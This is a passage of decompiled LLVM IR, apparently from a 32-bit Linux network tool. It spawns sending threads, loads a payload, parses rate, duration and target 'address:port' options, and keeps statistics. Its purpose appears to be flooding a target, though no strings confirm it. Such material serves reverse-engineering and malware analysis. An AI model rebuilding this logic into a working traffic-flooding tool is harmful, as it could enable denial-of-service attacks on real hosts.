  %storemerge25 = phi i32 [ %v4_804db73, %dec_label_pc_804db55 ], [ 0, %dec_label_pc_804daa2 ]
  %v0_804db6124 = phi i32 [ %v1_804db70, %dec_label_pc_804db55 ], [ %v2_804db32, %dec_label_pc_804daa2 ]
  store i32 %v2_804db3d, i32* %edx.global-to-local, align 4
  %v2_804db5b = mul i32 %storemerge25, 4
  %v2_804db5e = add i32 %v2_804db5b, %v2_804db3d
  store i32 %v2_804db5e, i32* %eax.global-to-local, align 4
  %v1_804db61 = add i32 %v0_804db6124, -4
  %v2_804db61 = inttoptr i32 %v1_804db61 to i32*
  store i32 0, i32* %v2_804db61, align 4
  %v1_804db63 = add i32 %v0_804db6124, -8
  %v2_804db63 = inttoptr i32 %v1_804db63 to i32*
  store i32 134537376, i32* %v2_804db63, align 4
  %v1_804db68 = add i32 %v0_804db6124, -12
  %v2_804db68 = inttoptr i32 %v1_804db68 to i32*
  store i32 0, i32* %v2_804db68, align 4
  %v0_804db6a = load i32, i32* %eax.global-to-local, align 4
  %v2_804db6a = add i32 %v0_804db6124, -16
  %v3_804db6a = inttoptr i32 %v2_804db6a to i32*
  store i32 %v0_804db6a, i32* %v3_804db6a, align 4
  %v1_804db6b = load i32, i32* %stack_var_-4, align 4
  %v2_804db6b = load i32, i32* %stack_var_0, align 4
  %v4_804db6b = inttoptr i32 %storemerge25 to i32*
  %v5_804db6b = call i32 @pthread_create(i32* %v4_804db6b, i32 %v1_804db6b, i32 %v2_804db6b, i32 %arg1)
  %v0_804db70 = load i32, i32* @esp, align 4
  %v1_804db70 = add i32 %v0_804db70, 16
  %v4_804db73 = add i32 %storemerge25, 1
  %v0_804db76 = load i32, i32* @global_var_807e0d8.203, align 8
  store i32 %v0_804db76, i32* %eax.global-to-local, align 4
  %v8_804db7e = icmp sgt i32 %v0_804db76, %v4_804db73
  br i1 %v8_804db7e, label %dec_label_pc_804db55, label %dec_label_pc_804db80

dec_label_pc_804db80:                             ; preds = %dec_label_pc_804db55, %dec_label_pc_804daa2
  %v0_804db61.lcssa = phi i32 [ %v2_804db32, %dec_label_pc_804daa2 ], [ %v1_804db70, %dec_label_pc_804db55 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_804daa2 ], [ %v4_804db73, %dec_label_pc_804db55 ]
  %v1_804db80 = add i32 %v0_804db61.lcssa, -4
  %v2_804db80 = inttoptr i32 %v1_804db80 to i32*
  store i32 0, i32* %v2_804db80, align 4
  %v1_804db82 = add i32 %v0_804db61.lcssa, -8
  %v2_804db82 = inttoptr i32 %v1_804db82 to i32*
  store i32 134537174, i32* %v2_804db82, align 4
  %v1_804db87 = add i32 %v0_804db61.lcssa, -12
  %v2_804db87 = inttoptr i32 %v1_804db87 to i32*
  store i32 0, i32* %v2_804db87, align 4
  %v2_804db89 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804db89, i32* %eax.global-to-local, align 4
  %v2_804db8c = add i32 %v0_804db61.lcssa, -16
  %v3_804db8c = inttoptr i32 %v2_804db8c to i32*
  store i32 %v2_804db89, i32* %v3_804db8c, align 4
  %v1_804db8d = load i32, i32* %stack_var_-4, align 4
  %v2_804db8d = load i32, i32* %stack_var_0, align 4
  %v4_804db8d = inttoptr i32 %storemerge.lcssa to i32*
  %v5_804db8d = call i32 @pthread_create(i32* %v4_804db8d, i32 %v1_804db8d, i32 %v2_804db8d, i32 %arg1)
  %v0_804db92 = load i32, i32* @esp, align 4
  %v0_804db95 = load i32, i32* @global_var_807dcc0.204, align 64
  %v1_804db9a = urem i32 %v0_804db95, 65536
  %v0_804db9f = load i32, i32* @global_var_807e0d4.201, align 4
  store i32 %v0_804db9f, i32* %edx.global-to-local, align 4
  %v0_804dba5 = load i8*, i8** @global_var_807e0d0.200, align 4
  %v1_804dba5 = ptrtoint i8* %v0_804dba5 to i32
  store i32 %v1_804dba5, i32* %ecx.global-to-local, align 4
  %v3_804dbae = inttoptr i32 %v0_804db92 to i32*
  store i32 %v1_804db9a, i32* %v3_804dbae, align 4
  store i32 %v2_804dafd, i32* %eax.global-to-local, align 4
  %v2_804dbb2 = add i32 %v0_804db92, -4
  %v3_804dbb2 = inttoptr i32 %v2_804dbb2 to i32*
  store i32 %v2_804dafd, i32* %v3_804dbb2, align 4
  %v0_804dbb3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804dbb3 = add i32 %v0_804db92, -8
  %v3_804dbb3 = inttoptr i32 %v2_804dbb3 to i32*
  store i32 %v0_804dbb3, i32* %v3_804dbb3, align 4
  %v1_804dbb4 = add i32 %v0_804db92, -12
  %v2_804dbb4 = inttoptr i32 %v1_804dbb4 to i32*
  store i32 ptrtoint ([33 x i8]* @global_var_8069bd0.205 to i32), i32* %v2_804dbb4, align 4
  %v0_804dbb9 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804dbb9 = add i32 %v0_804db92, -16
  %v3_804dbb9 = inttoptr i32 %v2_804dbb9 to i32*
  store i32 %v0_804dbb9, i32* %v3_804dbb9, align 4
  %v1_804dbba = load i32, i32* %stack_var_-4, align 4
  %v2_804dbba = call i32 @Send(i32 %storemerge.lcssa, i32 %v1_804dbba)
  %v0_804dbbf = load i32, i32* @esp, align 4
  %v3_804dbc2 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_804dbc2, i32* %eax.global-to-local, align 4
  %v1_804dbc8 = add i32 %v0_804dbbf, 20
  %v2_804dbc8 = inttoptr i32 %v1_804dbc8 to i32*
  store i32 0, i32* %v2_804dbc8, align 4
  %v0_804dbca = load i32, i32* %eax.global-to-local, align 4
  %v2_804dbca = add i32 %v0_804dbbf, 16
  %v3_804dbca = inttoptr i32 %v2_804dbca to i32*
  store i32 %v0_804dbca, i32* %v3_804dbca, align 4
  %v0_804dbcb = call i32 @pthread_join()
  %v0_804dbd0 = load i32, i32* @esp, align 4
  %v3_804dbd3 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_804dbd3, i32* %eax.global-to-local, align 4
  %v1_804dbd9 = add i32 %v0_804dbd0, 4
  %v2_804dbd9 = inttoptr i32 %v1_804dbd9 to i32*
  store i32 0, i32* %v2_804dbd9, align 4
  %v0_804dbdb = load i32, i32* %eax.global-to-local, align 4
  %v3_804dbdb = inttoptr i32 %v0_804dbd0 to i32*
  store i32 %v0_804dbdb, i32* %v3_804dbdb, align 4
  %v0_804dbdc = call i32 @pthread_join()
  store i32 %v0_804dbdc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dbe4

dec_label_pc_804dbe4:                             ; preds = %entry, %dec_label_pc_804db80
  %v0_804dbe8 = phi i32 [ %v1_804da6b, %entry ], [ %v0_804dbdc, %dec_label_pc_804db80 ]
  ret i32 %v0_804dbe8

; uselistorder directives
  uselistorder i32 %storemerge.lcssa, { 1, 0 }
  uselistorder i32 %v4_804db73, { 0, 2, 1 }
  uselistorder i32 %storemerge25, { 2, 1, 0 }
  uselistorder i32 %v2_804db3d, { 2, 1, 0 }
  uselistorder i32 %v0_804db1e, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-36, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 8, 20, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 ()* @pthread_join, { 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804dbe4, { 1, 0 }
  uselistorder label %dec_label_pc_804db55, { 1, 0 }
  uselistorder label %dec_label_pc_804daa2, { 1, 0 }
}

define i32 @printIntro() local_unnamed_addr {
entry:
  %v2_804dbf7 = call i32 @puts(i32 ptrtoint ([78 x i8]* @global_var_8069bf4.206 to i32))
  ret i32 %v2_804dbf7
}

define i32 @printUsage(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc01 = load i32, i32* @ebp, align 4
  store i32 %v0_804dc01, i32* %stack_var_-4, align 4
  %v4_804dc01 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804dc01, i32* @ebp, align 4
  %v0_804dc0c = load i8*, i8** @global_var_807e0d0.200, align 4
  %v1_804dc0c = ptrtoint i8* %v0_804dc0c to i32
  %v4_804dc1c = call i32 @Send(i32 %v1_804dc0c, i32 ptrtoint ([97 x i8]* @global_var_8069c44.207 to i32))
  %v2_804dc29 = call i32 @__GI_exit(i32 -1)
  ret i32 %v2_804dc29

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @initStats() local_unnamed_addr {
entry:
  store i32 0, i32* @global_var_807e0e4.208, align 4
  store i32 0, i32* @global_var_807e0e8.209, align 8
  store i32 0, i32* @global_var_807e0ec.210, align 4
  store i32 0, i32* @global_var_807e0f0.211, align 16
  store i32 0, i32* @global_var_807e0f4.212, align 4
  %v0_804dc64 = load i32, i32* @eax, align 4
  ret i32 %v0_804dc64
}

define i32 @processArgs(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg2 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc65 = load i32, i32* @ebp, align 4
  store i32 %v0_804dc65, i32* %stack_var_-4, align 4
  %v4_804dc65 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804dc65, i32* @ebp, align 4
  %v15_804dc68 = ptrtoint i32* %stack_var_-44 to i32
  store i16 0, i16* bitcast (i32* @global_var_807dcc0.204 to i16*), align 64
  store i32 10000, i32* @global_var_807dcd8.213, align 8
  store i32 0, i32* @global_var_807e0c4.214, align 4
  %v2_804dc8d = call i32 @__GI_time(i32* null)
  store i32 %v2_804dc8d, i32* %eax.global-to-local, align 4
  store i32 %v2_804dc8d, i32* @global_var_807e0c8.215, align 8
  store i32 0, i32* @global_var_807e0cc.216, align 4
  br label %dec_label_pc_804dd92

dec_label_pc_804dcb0:                             ; preds = %dec_label_pc_804dd92
  %v1_804dcb3 = add i32 %v0_804dda1, -63
  store i32 %v1_804dcb3, i32* %eax.global-to-local, align 4
  %v1_804dcc6 = mul i32 %v1_804dcb3, 4
  %v2_804dcc6 = add i32 %v1_804dcc6, ptrtoint (i32* @global_var_8069d98.217 to i32)
  %v3_804dcc6 = inttoptr i32 %v2_804dcc6 to i32*
  %v4_804dcc6 = load i32, i32* %v3_804dcc6, align 4
  store i32 %v4_804dcc6, i32* %eax.global-to-local, align 4
  switch i32 %v0_804dda1, label %dec_label_pc_804dd92 [
    i32 63, label %dec_label_pc_804dd85
    i32 100, label %dec_label_pc_804dd54
    i32 104, label %dec_label_pc_804dd85
    i32 112, label %dec_label_pc_804dd41
    i32 115, label %dec_label_pc_804dccf
    i32 116, label %dec_label_pc_804dd08
  ]

dec_label_pc_804dccf:                             ; preds = %dec_label_pc_804dcb0
  %v0_804dccf = load i32, i32* @global_var_807e498.218, align 8
  store i32 %v0_804dccf, i32* %eax.global-to-local, align 4
  %v3_804dcd7 = inttoptr i32 %v0_804dda6 to i32*
  store i32 %v0_804dccf, i32* %v3_804dcd7, align 4
  %v1_804dcd8 = call i32 @atol(i32 %v1_804dcb3)
  %v0_804dcdd = load i32, i32* @esp, align 4
  %v1_804dcdd = add i32 %v0_804dcdd, 16
  store i32 %v1_804dcd8, i32* @global_var_807e0cc.216, align 4
  store i32 %v1_804dcd8, i32* %eax.global-to-local, align 4
  %tmp28 = icmp slt i32 %v1_804dcd8, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_804dd08, label %dec_label_pc_804dcee

dec_label_pc_804dcee:                             ; preds = %dec_label_pc_804dccf
  %v2_804dcf1 = inttoptr i32 %v0_804dcdd to i32*
  store i32 ptrtoint ([21 x i8]* @global_var_8069ca5.219 to i32), i32* %v2_804dcf1, align 4
  %v1_804dcf6 = call i32 @printUsage(i32 %v1_804dcb3)
  store i32 %v1_804dcf6, i32* %eax.global-to-local, align 4
  %v0_804dcfb = load i32, i32* @esp, align 4
  %v2_804dd01 = inttoptr i32 %v0_804dcfb to i32*
  store i32 0, i32* %v2_804dd01, align 4
  %v1_804dd03 = call i32 @__GI_exit(i32 %v1_804dcb3)
  store i32 %v1_804dd03, i32* %eax.global-to-local, align 4
  %v0_804dd0d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dd08

dec_label_pc_804dd08:                             ; preds = %dec_label_pc_804dcb0, %dec_label_pc_804dccf, %dec_label_pc_804dcee
  %v0_804dd0d = phi i32 [ %v1_804dda6, %dec_label_pc_804dcb0 ], [ %v1_804dcdd, %dec_label_pc_804dccf ], [ %v0_804dd0d.pre, %dec_label_pc_804dcee ]
  %v0_804dd08 = load i32, i32* @global_var_807e498.218, align 8
  store i32 %v0_804dd08, i32* %eax.global-to-local, align 4
  %v2_804dd10 = add i32 %v0_804dd0d, -16
  %v3_804dd10 = inttoptr i32 %v2_804dd10 to i32*
  store i32 %v0_804dd08, i32* %v3_804dd10, align 4
  %v1_804dd11 = call i32 @atol(i32 %v1_804dcb3)
  %v0_804dd16 = load i32, i32* @esp, align 4
  %v1_804dd16 = add i32 %v0_804dd16, 16
  store i32 %v1_804dd11, i32* @global_var_807e0d8.203, align 8
  store i32 %v1_804dd11, i32* %eax.global-to-local, align 4
  %tmp30 = icmp slt i32 %v1_804dd11, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_804dd41, label %dec_label_pc_804dd27

dec_label_pc_804dd27:                             ; preds = %dec_label_pc_804dd08
  %v2_804dd2a = inttoptr i32 %v0_804dd16 to i32*
  store i32 ptrtoint ([29 x i8]* @global_var_8069cba.220 to i32), i32* %v2_804dd2a, align 4
  %v1_804dd2f = call i32 @printUsage(i32 %v1_804dcb3)
  store i32 %v1_804dd2f, i32* %eax.global-to-local, align 4
  %v0_804dd34 = load i32, i32* @esp, align 4
  %v2_804dd3a = inttoptr i32 %v0_804dd34 to i32*
  store i32 0, i32* %v2_804dd3a, align 4
  %v1_804dd3c = call i32 @__GI_exit(i32 %v1_804dcb3)
  store i32 %v1_804dd3c, i32* %eax.global-to-local, align 4
  %v0_804dd46.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dd41

dec_label_pc_804dd41:                             ; preds = %dec_label_pc_804dcb0, %dec_label_pc_804dd08, %dec_label_pc_804dd27
  %v0_804dd46 = phi i32 [ %v1_804dda6, %dec_label_pc_804dcb0 ], [ %v1_804dd16, %dec_label_pc_804dd08 ], [ %v0_804dd46.pre, %dec_label_pc_804dd27 ]
  %v0_804dd41 = load i32, i32* @global_var_807e498.218, align 8
  store i32 %v0_804dd41, i32* @eax, align 4
  %v2_804dd49 = add i32 %v0_804dd46, -16
  %v3_804dd49 = inttoptr i32 %v2_804dd49 to i32*
  store i32 %v0_804dd41, i32* %v3_804dd49, align 4
  %v0_804dd4a = call i32 @loadPayload()
  store i32 %v0_804dd4a, i32* %eax.global-to-local, align 4
  %v0_804dd4f = load i32, i32* @esp, align 4
  %v1_804dd4f = add i32 %v0_804dd4f, 16
  br label %dec_label_pc_804dd92

dec_label_pc_804dd54:                             ; preds = %dec_label_pc_804dcb0
  %v0_804dd54 = load i32, i32* @global_var_807e498.218, align 8
  store i32 %v0_804dd54, i32* %eax.global-to-local, align 4
  %v3_804dd5c = inttoptr i32 %v0_804dda6 to i32*
  store i32 %v0_804dd54, i32* %v3_804dd5c, align 4
  %v1_804dd5d = call i32 @atol(i32 %v1_804dcb3)
  %v0_804dd62 = load i32, i32* @esp, align 4
  %v1_804dd62 = add i32 %v0_804dd62, 16
  store i32 %v1_804dd5d, i32* @global_var_807dcd8.213, align 8
  store i32 %v1_804dd5d, i32* %eax.global-to-local, align 4
  %v1_804dd6f = icmp eq i32 %v1_804dd5d, 0
  %v1_804dd71 = icmp eq i1 %v1_804dd6f, false
  br i1 %v1_804dd71, label %dec_label_pc_804dd92, label %dec_label_pc_804dd73

dec_label_pc_804dd73:                             ; preds = %dec_label_pc_804dd54
  %v2_804dd76 = inttoptr i32 %v0_804dd62 to i32*
  store i32 ptrtoint ([15 x i8]* @global_var_8069cd7.221 to i32), i32* %v2_804dd76, align 4
  %v1_804dd7b = call i32 @printUsage(i32 %v1_804dcb3)
  store i32 %v1_804dd7b, i32* %eax.global-to-local, align 4
  %v0_804dd80 = load i32, i32* @esp, align 4
  %v1_804dd80 = add i32 %v0_804dd80, 16
  br label %dec_label_pc_804dd92

dec_label_pc_804dd85:                             ; preds = %dec_label_pc_804dcb0, %dec_label_pc_804dcb0
  %v2_804dd88 = inttoptr i32 %v0_804dda6 to i32*
  store i32 0, i32* %v2_804dd88, align 4
  %v1_804dd8a = call i32 @printUsage(i32 %v1_804dcb3)
  store i32 %v1_804dd8a, i32* %eax.global-to-local, align 4
  %v0_804dd8f = load i32, i32* @esp, align 4
  %v1_804dd8f = add i32 %v0_804dd8f, 16
  br label %dec_label_pc_804dd92

dec_label_pc_804dd92:                             ; preds = %dec_label_pc_804dcb0, %dec_label_pc_804dd54, %dec_label_pc_804dd73, %dec_label_pc_804dd41, %dec_label_pc_804dd85, %entry
  %v0_804dd97 = phi i32 [ %v15_804dc68, %entry ], [ %v1_804dd8f, %dec_label_pc_804dd85 ], [ %v1_804dd4f, %dec_label_pc_804dd41 ], [ %v1_804dd80, %dec_label_pc_804dd73 ], [ %v1_804dd62, %dec_label_pc_804dd54 ], [ %v1_804dda6, %dec_label_pc_804dcb0 ]
  %v0_804dd92 = load i32, i32* bitcast ([7 x i8]** @global_var_806f71c.223 to i32*), align 4
  store i32 %v0_804dd92, i32* %eax.global-to-local, align 4
  %v2_804dd9a = add i32 %v0_804dd97, -8
  %v3_804dd9a = inttoptr i32 %v2_804dd9a to i32*
  store i32 %v0_804dd92, i32* %v3_804dd9a, align 4
  %v5_804dd9b = add i32 %v0_804dd97, -12
  %v6_804dd9b = inttoptr i32 %v5_804dd9b to i32*
  store i32 %tmp20, i32* %v6_804dd9b, align 4
  %v5_804dd9e = add i32 %v0_804dd97, -16
  %v6_804dd9e = inttoptr i32 %v5_804dd9e to i32*
  store i32 %arg1, i32* %v6_804dd9e, align 4
  %v0_804dda1 = call i32 @getopt()
  store i32 %v0_804dda1, i32* %eax.global-to-local, align 4
  %v0_804dda6 = load i32, i32* @esp, align 4
  %v1_804dda6 = add i32 %v0_804dda6, 16
  %v13_804ddac = icmp eq i32 %v0_804dda1, -1
  %v1_804ddb0 = icmp eq i1 %v13_804ddac, false
  br i1 %v1_804ddb0, label %dec_label_pc_804dcb0, label %dec_label_pc_804ddb6

dec_label_pc_804ddb6:                             ; preds = %dec_label_pc_804dd92
  %v0_804ddb6 = load i32, i32* @global_var_8073fb8.224, align 8
  %v2_804ddbb = mul i32 %v0_804ddb6, 4
  %v5_804ddbe = add i32 %v2_804ddbb, %tmp20
  %v2_804ddcd = sub i32 %arg1, %v0_804ddb6
  store i32 %v2_804ddcd, i32* %eax.global-to-local, align 4
  %v7_804ddd6 = icmp sgt i32 %v2_804ddcd, 5
  br i1 %v7_804ddd6, label %dec_label_pc_804ddd8, label %dec_label_pc_804dde8

dec_label_pc_804ddd8:                             ; preds = %dec_label_pc_804ddb6
  %v2_804dddb = inttoptr i32 %v0_804dda6 to i32*
  store i32 ptrtoint ([20 x i8]* @global_var_8069ce6.225 to i32), i32* %v2_804dddb, align 4
  %v1_804dde0 = call i32 @printUsage(i32 %v0_804dda1)
  store i32 %v1_804dde0, i32* %eax.global-to-local, align 4
  %v0_804dde5 = load i32, i32* @esp, align 4
  %v1_804dde5 = add i32 %v0_804dde5, 16
  br label %dec_label_pc_804dde8

dec_label_pc_804dde8:                             ; preds = %dec_label_pc_804ddb6, %dec_label_pc_804ddd8
  %v0_804ddee = phi i32 [ %v1_804dda6, %dec_label_pc_804ddb6 ], [ %v1_804dde5, %dec_label_pc_804ddd8 ]
  %v4_804dde8 = add i32 %v2_804ddcd, -4
  %v9_804dde8 = sub i32 3, %v2_804ddcd
  %v10_804dde8 = and i32 %v9_804dde8, %v2_804ddcd
  %v11_804dde8 = icmp slt i32 %v10_804dde8, 0
  %v12_804dde8 = icmp eq i32 %v4_804dde8, 0
  %v13_804dde8 = icmp slt i32 %v4_804dde8, 0
  %v3_804ddec = icmp eq i1 %v13_804dde8, %v11_804dde8
  %v4_804ddec = icmp eq i1 %v12_804dde8, false
  %v5_804ddec = and i1 %v4_804ddec, %v3_804ddec
  br i1 %v5_804ddec, label %dec_label_pc_804ddfe, label %dec_label_pc_804ddee

dec_label_pc_804ddee:                             ; preds = %dec_label_pc_804dde8
  %v1_804ddf1 = add i32 %v0_804ddee, -16
  %v2_804ddf1 = inttoptr i32 %v1_804ddf1 to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_8069cfa.226 to i32), i32* %v2_804ddf1, align 4
  %v1_804ddf6 = call i32 @printUsage(i32 %v2_804ddcd)
  store i32 %v1_804ddf6, i32* %eax.global-to-local, align 4
  %v0_804ddfb = load i32, i32* @esp, align 4
  %v1_804ddfb = add i32 %v0_804ddfb, 16
  br label %dec_label_pc_804ddfe

dec_label_pc_804ddfe:                             ; preds = %dec_label_pc_804dde8, %dec_label_pc_804ddee
  %v0_804de17 = phi i32 [ %v0_804ddee, %dec_label_pc_804dde8 ], [ %v1_804ddfb, %dec_label_pc_804ddee ]
  %v5_804de12 = add i32 %v5_804ddbe, 4
  store i32 %v5_804de12, i32* %eax.global-to-local, align 4
  %v1_804de15 = inttoptr i32 %v5_804de12 to i32*
  %v2_804de15 = load i32, i32* %v1_804de15, align 4
  store i32 %v2_804de15, i32* %eax.global-to-local, align 4
  %v2_804de1a = add i32 %v0_804de17, -12
  %v3_804de1a = inttoptr i32 %v2_804de1a to i32*
  store i32 %v2_804de15, i32* %v3_804de1a, align 4
  %v1_804de1b = add i32 %v0_804de17, -16
  %v2_804de1b = inttoptr i32 %v1_804de1b to i32*
  store i32 ptrtoint (i32* @global_var_807dcc8.227 to i32), i32* %v2_804de1b, align 4
  %v3_804de20 = call i32 @get_iface_ip(i16* null, i32 1)
  store i32 %v3_804de20, i32* %eax.global-to-local, align 4
  %v0_804de25 = load i32, i32* @esp, align 4
  %v1_804de28 = icmp eq i32 %v3_804de20, 0
  %v1_804de2a = icmp eq i1 %v1_804de28, false
  br i1 %v1_804de2a, label %dec_label_pc_804de6a, label %dec_label_pc_804de2c

dec_label_pc_804de2c:                             ; preds = %dec_label_pc_804ddfe
  store i32 %v5_804ddbe, i32* %eax.global-to-local, align 4
  %v1_804de43 = inttoptr i32 %v5_804ddbe to i32*
  %v2_804de43 = load i32, i32* %v1_804de43, align 4
  store i32 %v2_804de43, i32* %eax.global-to-local, align 4
  %v2_804de48 = add i32 %v0_804de25, 4
  %v3_804de48 = inttoptr i32 %v2_804de48 to i32*
  store i32 %v2_804de43, i32* %v3_804de48, align 4
  %v2_804de49 = inttoptr i32 %v0_804de25 to i32*
  store i32 ptrtoint (i32* @global_var_807dcc8.227 to i32), i32* %v2_804de49, align 4
  %v3_804de4e = call i32 @get_iface_ip(i16* inttoptr (i32 1 to i16*), i32 0)
  store i32 %v3_804de4e, i32* %eax.global-to-local, align 4
  %v0_804de53 = load i32, i32* @esp, align 4
  %v1_804de56 = icmp eq i32 %v3_804de4e, 0
  %v1_804de58 = icmp eq i1 %v1_804de56, false
  br i1 %v1_804de58, label %dec_label_pc_804de6a, label %dec_label_pc_804de5a

dec_label_pc_804de5a:                             ; preds = %dec_label_pc_804de2c
  %v2_804de5d = inttoptr i32 %v0_804de53 to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_8069d0d.228 to i32), i32* %v2_804de5d, align 4
  %v1_804de62 = call i32 @printUsage(i32 0)
  store i32 %v1_804de62, i32* %eax.global-to-local, align 4
  %v0_804de67 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804de6a

dec_label_pc_804de6a:                             ; preds = %dec_label_pc_804de2c, %dec_label_pc_804ddfe, %dec_label_pc_804de5a
  %v0_804dea6.in = phi i32 [ %v0_804de25, %dec_label_pc_804ddfe ], [ %v0_804de53, %dec_label_pc_804de2c ], [ %v0_804de67, %dec_label_pc_804de5a ]
  %stack_var_-16.0 = phi i32 [ 4, %dec_label_pc_804ddfe ], [ 0, %dec_label_pc_804de2c ], [ 0, %dec_label_pc_804de5a ]
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_804ddfe ], [ 4, %dec_label_pc_804de2c ], [ 4, %dec_label_pc_804de5a ]
  %v5_804de70 = add i32 %stack_var_-20.0, %v5_804ddbe
  store i32 %v5_804de70, i32* %eax.global-to-local, align 4
  %v1_804de73 = inttoptr i32 %v5_804de70 to i32*
  %v2_804de73 = load i32, i32* %v1_804de73, align 4
  store i32 %v5_804de70, i32* %eax.global-to-local, align 4
  %v2_804de81 = load i32, i32* %v1_804de73, align 4
  %storemerge33 = inttoptr i32 %v2_804de81 to i8*
  store i32 %v2_804de81, i32* %eax.global-to-local, align 4
  %v2_804de8e34 = load i8, i8* %storemerge33, align 1
  %v3_804de8e35 = zext i8 %v2_804de8e34 to i32
  %v5_804de8e36 = and i32 %v2_804de81, -256
  %v6_804de8e37 = or i32 %v3_804de8e35, %v5_804de8e36
  store i32 %v6_804de8e37, i32* %eax.global-to-local, align 4
  %v10_804de9042 = icmp eq i8 %v2_804de8e34, 58
  br i1 %v10_804de9042, label %dec_label_pc_804de9d, label %dec_label_pc_804de94

dec_label_pc_804de88:                             ; preds = %dec_label_pc_804de94
  %v5_804de88 = add i32 %storemerge.in43, 1
  %storemerge = inttoptr i32 %v5_804de88 to i8*
  store i32 %v5_804de88, i32* %eax.global-to-local, align 4
  %v2_804de8e = load i8, i8* %storemerge, align 1
  %v3_804de8e = zext i8 %v2_804de8e to i32
  %v5_804de8e = and i32 %v5_804de88, -256
  %v6_804de8e = or i32 %v3_804de8e, %v5_804de8e
  store i32 %v6_804de8e, i32* %eax.global-to-local, align 4
  %v10_804de90 = icmp eq i8 %v2_804de8e, 58
  br i1 %v10_804de90, label %dec_label_pc_804de9d, label %dec_label_pc_804de94

dec_label_pc_804de94:                             ; preds = %dec_label_pc_804de6a, %dec_label_pc_804de88
  %v5_804de8e45 = phi i32 [ %v5_804de8e, %dec_label_pc_804de88 ], [ %v5_804de8e36, %dec_label_pc_804de6a ]
  %storemerge44 = phi i8* [ %storemerge, %dec_label_pc_804de88 ], [ %storemerge33, %dec_label_pc_804de6a ]
  %storemerge.in43 = phi i32 [ %v5_804de88, %dec_label_pc_804de88 ], [ %v2_804de81, %dec_label_pc_804de6a ]
  store i32 %storemerge.in43, i32* %eax.global-to-local, align 4
  %v2_804de97 = load i8, i8* %storemerge44, align 1
  %v3_804de97 = zext i8 %v2_804de97 to i32
  %v6_804de97 = or i32 %v3_804de97, %v5_804de8e45
  store i32 %v6_804de97, i32* %eax.global-to-local, align 4
  %v4_804de99 = icmp eq i8 %v2_804de97, 0
  %v1_804de9b = icmp eq i1 %v4_804de99, false
  br i1 %v1_804de9b, label %dec_label_pc_804de88, label %dec_label_pc_804de9d

dec_label_pc_804de9d:                             ; preds = %dec_label_pc_804de88, %dec_label_pc_804de94, %dec_label_pc_804de6a
  %storemerge.in.lcssa = phi i32 [ %v2_804de81, %dec_label_pc_804de6a ], [ %storemerge.in43, %dec_label_pc_804de94 ], [ %v5_804de88, %dec_label_pc_804de88 ]
  %storemerge.lcssa = phi i8* [ %storemerge33, %dec_label_pc_804de6a ], [ %storemerge44, %dec_label_pc_804de94 ], [ %storemerge, %dec_label_pc_804de88 ]
  %v5_804de8e.lcssa = phi i32 [ %v5_804de8e36, %dec_label_pc_804de6a ], [ %v5_804de8e45, %dec_label_pc_804de94 ], [ %v5_804de8e, %dec_label_pc_804de88 ]
  store i32 %storemerge.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_804dea0 = load i8, i8* %storemerge.lcssa, align 1
  %v3_804dea0 = zext i8 %v2_804dea0 to i32
  %v6_804dea0 = or i32 %v3_804dea0, %v5_804de8e.lcssa
  store i32 %v6_804dea0, i32* %eax.global-to-local, align 4
  %v4_804dea2 = icmp eq i8 %v2_804dea0, 0
  %v1_804dea4 = icmp eq i1 %v4_804dea2, false
  br i1 %v1_804dea4, label %dec_label_pc_804deb6, label %dec_label_pc_804dea6

dec_label_pc_804dea6:                             ; preds = %dec_label_pc_804de9d
  %v2_804dea9 = inttoptr i32 %v0_804dea6.in to i32*
  store i32 ptrtoint ([23 x i8]* @global_var_8069d20.229 to i32), i32* %v2_804dea9, align 4
  %v2_804deae = call i32 @printUsage(i32 %storemerge.in.lcssa)
  store i32 %v2_804deae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804deb6

dec_label_pc_804deb6:                             ; preds = %dec_label_pc_804de9d, %dec_label_pc_804dea6
  store i32 %storemerge.in.lcssa, i32* %eax.global-to-local, align 4
  store i8 0, i8* %storemerge.lcssa, align 1
  %v5_804debc = add i32 %storemerge.in.lcssa, 1
  %v22_804debc = inttoptr i32 %v5_804debc to i8*
  %v0_804debf = load i32, i32* @esp, align 4
  %v6_804dec2 = add i32 %v0_804debf, -16
  %v7_804dec2 = inttoptr i32 %v6_804dec2 to i32*
  store i32 %v5_804debc, i32* %v7_804dec2, align 4
  %v2_804dec5 = call i32 @atol(i32 %v5_804debc)
  %v3_804dec5 = trunc i32 %v2_804dec5 to i16
  %v0_804deca = load i32, i32* @esp, align 4
  store i16 %v3_804dec5, i16* bitcast (i32* @global_var_807dcc0.204 to i16*), align 64
  %v0_804ded3 = load i32, i32* @global_var_807dcc0.204, align 64
